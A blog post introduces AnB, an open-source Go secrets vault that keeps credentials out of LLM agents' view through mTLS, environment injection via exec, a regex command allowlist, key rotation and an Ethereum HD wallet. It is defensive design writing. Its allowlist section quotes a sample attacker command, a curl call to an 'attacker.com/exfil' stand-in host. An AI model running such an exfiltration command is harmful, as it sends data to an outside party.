---
title: "Alice and Bob: A Client/Server Secrets Vault Built for the AI Agent Era"
date: 2026-05-31T06:30:00+08:00
draft: false
tags: ["Security", "Secrets Management", "KMS", "AI Agent", "Go", "mTLS", "Cryptography", "BIP-39", "Ethereum", "Vault"]
categories: ["Tools", "Architecture"]
author: "Kaka"
description: "A client/server secrets vault built for the LLM agent era: Alice (the client) only ever sees ciphertext; Bob (the daemon) holds the master key behind mTLS. AES-256-GCM + Argon2id + versioned K + lazy rewrap + built-in BIP-39 HD wallet."
---

## Why `.env` files aren't enough anymore

In 2026, an LLM agent can already read your config files, decide what to deploy, and run `kubectl apply` on your behalf. The credential stores you trust today — `~/.aws/credentials`, `.env` files, raw env vars, GUI password managers — were built for **humans typing and clicking**. Hand the keyboard to an agent and three failure modes show up that no traditional secrets store was designed to handle:

| Failure mode | What happens with a typical secrets store |
|---|---|
| **Plaintext-on-disk** | `.env` / `~/.aws/credentials` / kubeconfig with embedded tokens — any agent that can `cat` reads them straight |
| **Stdout exfil** | Agent runs `op read op://Vault/Item/password` (or equivalent), the secret lands in the agent's tool output, the agent framework streams that back to the LLM provider as context |
| **Argv leak** | Agent runs `mycli --token sk-…`, the token shows up in `ps`, in shell history, in audit logs, and in any sibling process's `/proc/PID/cmdline` |

This post introduces my open-source project [AnB (Alice and Bob)](https://github.com/kaka-milan-22/AnB): a **client/server secrets vault** built from the ground up for the LLM agent era. It is the spiritual successor to [agent-vault](https://www.npmjs.com/package/@kaka-milan-22/agent-vault) (TypeScript) — same command surface (`read`/`write`/`set`/`get`/`exec`), same `<agent-vault:key>` placeholder grammar — but the master key is **moved off the client entirely** into a separate, mTLS-authenticated KMS daemon.

The design goal is a single sentence: **agents should never see plaintext keys** — not via stdout, not via argv, not via shell history, not via the agent framework's tool output stream.

---

## Architecture: Alice holds ciphertext, Bob holds the keys

AnB is two Go binaries:

- **Alice** (client CLI): the tool your agents call. Stores ciphertext + metadata locally, runs a redaction engine, hands individual ciphertexts to Bob for decrypt over mTLS.
- **Bob** (KMS daemon): holds the master key (Argon2id-wrapped at rest, unlocked once by an operator-typed password at `bob serve` startup, kept in `mlock`'d memory with an optional idle TTL). Bob only serves crypto operations to authenticated, authorized clients.

```
                ┌──────────────────────────────────────────────────────────┐
                │  LLM agent (Claude Code / Cursor / cron / arbitrary)     │
                │      ↓  shell call: alice exec --env K=<placeholder> -- │
                └──────────────────────────────────────────────────────────┘
                                          │
   ┌──────────────────────────────────────┼──────────────────────────────────────┐
   │                        alice CLI — 4-layer safety stack                     │
   │                                                                             │
   │   1. TTY gate     sensitive ops (set/get --reveal/import) refuse non-TTY    │
   │   2. allowlist    `alice exec` runs ONLY commands matching a regex rule     │
   │   3. redaction    `read` substitutes secrets out; `write` substitutes in    │
   │   4. injection    secret → child env via syscall.Exec; never argv, never    │
   │                   alice stdout, never the agent's tool-output context       │
   └─────────────────────────────────────────────────────────────────────────────┘
                                          │
                            mTLS (private CA, mutual cert auth)
                                          │
                                          ▼
                          ┌──────────────────────────────┐
                          │  bob — KMS daemon            │
                          │  • master key in mlock'd mem │
                          │  • Argon2id-wrapped at rest  │
                          │  • per-identity authz        │
                          │  • JSON audit log            │
                          │  • per-identity rate limit   │
                          └──────────────────────────────┘
                                          │
                                          ▼
                                   ┌─────────────┐
                                   │envelope.json│
                                   │ (encrypted)  │
                                   └─────────────┘
```

The master key lives **only** in Bob's `mlock`'d memory. It is wrapped at rest with Argon2id under an operator-typed master password; that password is asked once at `bob serve` startup and never touches disk. Alice carries only the ciphertext of individual secrets in `vault.json` (also AES-256-GCM, sealed by Bob, with a key version ID for rotation). Same envelope-encryption pattern as AWS KMS or HashiCorp Vault Transit, scoped to a single self-hosted pair of binaries you fully control.

---

## Key design choices

### 1. `alice exec` — the agent injection path

`alice exec` is the **only** write operation an agent should use. Here's the call:

```sh
alice exec --env API_TOKEN='<agent-vault:my-api-token>' -- \
    curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com/me
```

What that line does:

1. alice parses `--env API_TOKEN=<agent-vault:my-api-token>` — recognizes it as a placeholder, asks Bob to decrypt `my-api-token`.
2. alice checks `~/.anb/alice/exec-allowlist.rules` — the command line `/usr/bin/curl -H "Authorization: Bearer ..." https://api.example.com/me` must match a regex rule, and that rule must permit injecting an env variable named `API_TOKEN`.
3. allowlist passes → alice calls `syscall.Exec(/usr/bin/curl, [...args], [API_TOKEN=plaintext, ...inherited env])` — **replacing itself** with curl.

Three key properties:

- **Secret never in argv**: it lives only in the child's `environ`. Invisible to `ps`, to shell history, to `/proc/PID/cmdline` (which exposes argv, not environ; environ is in a separate file with 0600 default).
- **Secret never in alice's stdout**: alice prints no plaintext. An agent framework grabbing alice's stdout as tool output sees only `→ exec /usr/bin/curl with env=[API_TOKEN] rule=[my-curl-rule]` — an audit line, no value.
- **Process is replaced, not forked**: alice no longer exists once exec returns. The child's exit code becomes alice's exit code. There is no parent supervising the child.

### 2. Regex allowlist — refuse arbitrary agent commands

`exec-allowlist.rules` is a plain-text file, one rule per line:

```
^/usr/bin/curl -H "Authorization: Bearer .+" https://api\.example\.com/me$	API_TOKEN	# api-example-readonly
```

Three tab-separated fields: **regex** (Go RE2, implicitly anchored `^(?:…)$`, **no ReDoS risk**), **env-csv** (comma-separated env variable names the rule permits the operator to inject), **`#`-prefixed label** (free text, appears in the audit log as `rule=[label]`).

Alice canonicalizes the invocation into `shellescape(cmd) + " " + shellescape(arg1) + …` and tests it top-to-bottom against the rules. **First match wins**; the `--env` set the operator passes must be a subset of the rule's env-csv; no match = hard-deny.

Why regex instead of prefix matching? Because an attacker might smuggle in `/usr/bin/curl http://attacker.com/exfil` — same binary, completely different semantics. Regex gives the operator **per-URL, per-argument** control granularity.

`alice allowlist-check` is the companion lint tool. It rejects rules that match everything (`.*`, `^.*$`), warns on over-broad patterns, flags DANGER on `env=*` + loose regex combos.

### 3. Versioned master keys + lazy rewrap — transparent rotation

This is the AnB v2.6+ story. **The master key can have multiple versions**, and every ciphertext in `vault.json` carries a `v<N>:` prefix indicating which K it was sealed under:

```
envelope.json (Bob's on-disk state)
{
  "version": 3,
  "keys": [
    { "id": 1, "created": "2026-04-01T...", "kdf": "argon2id", "wrapped": "..." },
    { "id": 2, "created": "2026-05-15T...", "kdf": "argon2id", "wrapped": "..." }
  ],
  "current": 2
}
```

Three commands cover the full rotation story:

| Command | Effect |
|---|---|
| `bob rotate-master-password` | Default: **change password + add a new K**. Pass `--keep-key` to fall back to v2.3 password-only rotation |
| `bob rotate-master-key` | Add a fresh K under the **same** password — pure key rotation, no password change |
| `bob rotate-master-key --finalize <id>` | Irrevocably destroy K_id, removing it from envelope.json and from Bob's mlock'd memory |

**Lazy rewrap is the default** — you don't need to run a migration command. On any normal `alice get` / `alice exec`, if the ciphertext is on an old K, Bob decrypts it AND **simultaneously re-seals the same plaintext under the current K**, returning both to alice; alice writes the new ciphertext back. The next read sees the current K.

Operator's view:

```sh
bob rotate-master-key                        # add K_2
alice rekey-status                           # check progress: v1: 47 entries, v2: 0
# let agents do their normal work for days/weeks…
alice rekey-status                           # v1: 3 entries, v2: 44
# wait until v1: 0
bob rotate-master-key --finalize 1           # safely destroy K_1
```

`alice rekey` is the impatient option: **force-migrate every non-current entry immediately** (eager equivalent of lazy rewrap).

Why bother? **"Suspected compromise" needs `--finalize`**. If an old K's material may have passed through someone's hands (operator left, backup disk was borrowed, suspicious dump file appeared), you need a **deterministic destruction path** — not "the GC will get to it eventually".

### 4. Built-in BIP-39 HD wallet

AnB v3.3+ ships a full Ethereum HD wallet inside alice. The reasoning is simple: **a mnemonic is just another kind of secret** and deserves the same KMS-grade custody.

```
mnemonic (24 words)
   │ BIP-39 PBKDF2-HMAC-SHA512(salt="mnemonic", 2048 rounds)
   ↓
seed (64 B)
   │ BIP-32 master derive
   ↓
master private key (32 B + chain code)
   │ BIP-44 path m/44'/60'/0'/0/N
   ↓
child private key (32 B)
   │ secp256k1 scalar mul G
   ↓
uncompressed public key (64 B)
   │ keccak256, last 20 B
   ↓
ETH address
   │ EIP-55 mixed-case checksum
   ↓
0x9858EfFD232B4033E47d90003D41EC34EcaEda94
```

All derivation is **fully deterministic** — given the same mnemonic:

- `alice eth address --index 0` always produces the same address
- `alice eth address --index 5` always produces a different (5th) address (both belong to the same mnemonic)
- Lose your disk and vault.json entirely, and as long as you remember the 24 words, you can recover **every** address + private key

So vault.json stores **only the mnemonic** — no derived state. Every operation re-derives on the fly, finishing in milliseconds.

```sh
alice eth new                          # generate 24 words + derive /0 + store
alice eth new --name eth-cold          # second independent wallet (cold wallet)
alice eth address --name eth-cold --index 5
alice eth list                         # list every ETH wallet + address
alice eth show --reveal-mnemonic       # print 24 words to TTY (paper backup)
```

Deliberately **not** in scope:

- **No transaction signing**. AnB stays in custody territory. To send a tx, pipe the mnemonic into `cast` / `foundry` / your own signer via `alice exec`: `alice exec --env ETH_MNEMONIC='<agent-vault:eth>' -- cast wallet sign-tx --mnemonic-env ETH_MNEMONIC …`.
- **No non-EVM chains**. All EVM chains (Ethereum, Polygon, Arbitrum, Optimism, Base — they share one address space) are supported. Bitcoin, Solana, etc. need different curves and address encodings — out of scope.

This boundary matters. The moment we add signing + RPC + tx broadcasting to alice, it becomes a half-baked MetaMask, trusted client code triples, the security surface explodes. AnB does custody; signing tools do signing; env injection wires them up. Each does one job well.

---

## Five-minute end-to-end

Full setup + first use, on one machine:

```sh
# 1. Install both binaries
go install github.com/kaka-milan-22/AnB/v3/cmd/alice@latest
go install github.com/kaka-milan-22/AnB/v3/cmd/bob@latest

# 2. Bring up Bob (one-time operator setup)
bob ca init                                 # private CA
bob init --host localhost,127.0.0.1         # wrap master key + mint server cert (prompts for password)
bob serve -D --addr 127.0.0.1:8443          # daemonize

# 3. Enroll Alice
alice enroll --bob 127.0.0.1:8443 \
             --ca ~/.anb/bob/ca.crt \
             --identity my-laptop           # generate keypair + CSR

# 4. Operator signs the CSR
bob sign-csr ~/.anb/alice/client.csr        # prints pairing code; alice operator types it back OOB

# 5. Alice installs the signed cert
alice install-cert ~/.anb/bob/signed/my-laptop.crt
alice status                                # → Bob: unlocked  ✓

# 6. Store a secret
alice set my-api-token                       # TTY prompts for the value

# 7. Have an agent USE it without ever seeing the plaintext
alice exec --env API_TOKEN='<agent-vault:my-api-token>' -- \
    curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com
```

---

## Security checklist

Run these before trusting AnB with real value:

```sh
# (1) vault.json is ciphertext only
cat ~/.anb/alice/vault.json | jq '.secrets | map(.value) | .[0]'
# → "v3:8c4f...:..." (hex ciphertext, no plaintext)

# (2) After `alice exec`, ps shows no secret
alice exec --env TOK='<agent-vault:my-api-token>' -- sleep 30 &
ps aux | grep sleep
# → "/bin/sleep 30" — TOK is in the child's environ, NOT argv

# (3) Bob's audit log records every decrypt
tail -5 ~/.anb/bob/bob.log | jq .
# → JSON-line audit, with identity / op / keys / reason

# (4) Master key was never on the alice side
ls -la ~/.anb/alice/
# → vault.json, client.key (0600), client.crt, ca.crt, config.json, exec-allowlist.rules
# → NO master.key, NO envelope.json — those live in ~/.anb/bob/

# (5) Bob's master key is mlock'd
ps -o rss,command $(cat ~/.anb/bob/bob.pid)
# → RSS includes the master key page, but the page is mlocked
#   (won't swap to disk under memory pressure)

# (6) Allowlist refuses unknown commands when an agent calls without TTY
alice exec --env API_TOKEN='<agent-vault:my-api-token>' -- /bin/cat /etc/hosts
# → ✗ DENIED  (assuming /bin/cat isn't in your allowlist)
```

---

## Audit log + agent-callable matrix

`~/.anb/bob/bob.log` is one JSON line per event. A real example:

```json
{"ts":"2026-05-31T00:42:01.234Z","kind":"ALLOW","identity":"my-laptop","op":"decrypt","keys":["my-api-token"],"reason":"deploy v1.2"}
{"ts":"2026-05-31T00:42:01.456Z","kind":"DENY","identity":"agent-ci","op":"decrypt","key":"prod-master-password","cause":"unauthorized"}
{"ts":"2026-05-31T00:42:05.789Z","kind":"RATELIMIT","identity":"agent-ci","op":"decrypt","cause":"limit-exceeded"}
```

Event kinds include `ALLOW` / `DENY` / `RATELIMIT` / `KEY_REWRAP` / `KEY_ADDED` / `KEY_FINALIZED` / `HANDSHAKE_FAIL` / `AUTOLOCK`. `jq` is sufficient for analysis:

```sh
# All denials in the last hour
jq -c 'select(.kind == "DENY" and (.ts | fromdateiso8601) > (now - 3600))' ~/.anb/bob/bob.log

# Top 10 most-accessed keys
jq -r 'select(.kind=="ALLOW") | .keys[]' ~/.anb/bob/bob.log | sort | uniq -c | sort -rn | head

# Every secret read by agent-ci today
jq -c 'select(.identity=="agent-ci" and .op=="decrypt")' ~/.anb/bob/bob.log
```

What an agent can and cannot do:

| Operation | Agent (no TTY) | Human (TTY) |
|---|---|---|
| `list` / `has` / `status` | ✓ | ✓ |
| `read` / `scan` (redacted output) | ✓ | ✓ |
| `exec` (placeholder-resolved env injection) | ✓ if allowlist rule matches | ✓ + interactive confirm on unmatched |
| `write` / `template` (placeholder restoration) | ✓ | ✓ |
| `shell` (interactive sub-shell with env injection) | refuse — TTY only | ✓ |
| `set` / `import` / `rm` (mutate vault) | refuse — TTY only | ✓ |
| `get` / `eth show` (metadata read) | ✓ | ✓ |
| `get --reveal` / `eth show --reveal-mnemonic` (plaintext) | refuse — stdout-TTY required | ✓ |
| `eth new` / `eth import` (HD wallet creation) | refuse — TTY only | ✓ |
| `gen` (password generator) | ✓ (pipe-friendly since v3.2) | ✓ |

---

## What's next / known boundaries

AnB is currently v3.3.2. Still on the backlog:

- **`alice audit --tail`** — stream Bob's JSON audit log over mTLS to the alice side. JSON format already landed in v2.5; needs the wire op + alice subcommand. Important once Bob runs on a remote host.
- **Certificate expiry warnings** — `alice status` / `bob serve` flag when client/server cert is <30d from expiry. Three-line `if`.
- **PKCS#11 client-key backend** — store alice's private key on a hardware token (Yubikey / Nitrokey / SoloKey) so a file-level attacker can't impersonate her identity.

Explicitly **out of scope**:

- **Multi-machine key sync** — AnB is a pair of self-hosted binaries, not a cloud service. For N machines sharing keys, use 1Password or Vault.
- **GUI / browser autofill** — non-goal. Keep using Apple Passwords for browser-side credentials.
- **Signing / on-chain interaction** (for the ETH wallet) — AnB stays in custody territory. Signing is delegated to `cast` / `foundry`-class tools through `alice exec`.

---

## Closing thought

AnB tries to answer one concrete question: **when the thing you trust is no longer a specific programmer but a language model that hallucinates, where should the keys live?**

The answer isn't some new cryptography — AnB uses the same AES-256-GCM, Argon2id, mTLS, BIP-39/44 you already know. The answer is in **architectural boundaries**:

- The master key **moves off** the client into a separate, mTLS-authenticated daemon. Alice only ever sees ciphertext.
- The injection path uses `syscall.Exec` to put the secret into the **child's environ**, not its argv or anyone's stdout. The agent framework's tool-output stream never sees plaintext.
- A **regex allowlist** instead of a path prefix decides which commands the agent can run — giving the operator per-URL / per-argument granularity.
- **Versioned master keys + lazy rewrap** make key rotation a routine background operation, not a quarterly event.
- The **built-in HD wallet** treats mnemonics as just another kind of secret deserving the same custody, rather than spinning up a separate wallet app.

The whole project is Go, ~7000 LOC, MIT-licensed, source at [github.com/kaka-milan-22/AnB](https://github.com/kaka-milan-22/AnB). If you've been wrestling with "how do I let an agent touch credentials safely" — issues and PRs welcome.

## References

- AnB project: [github.com/kaka-milan-22/AnB](https://github.com/kaka-milan-22/AnB)
- agent-vault (predecessor, replaced by AnB): [npmjs.com/package/@kaka-milan-22/agent-vault](https://www.npmjs.com/package/@kaka-milan-22/agent-vault)
- wallet (EVM agent wallet built on top of AnB): [github.com/kaka-milan-22/wallet](https://github.com/kaka-milan-22/wallet)
- BIP-39 / BIP-32 / BIP-44 specifications: [bitcoin/bips](https://github.com/bitcoin/bips)
- EIP-55 (Ethereum address checksum): [ethereum/EIPs](https://eips.ethereum.org/EIPS/eip-55)
- AWS KMS envelope encryption (isomorphic pattern): [docs.aws.amazon.com/kms/latest/developerguide/concepts.html](https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html)
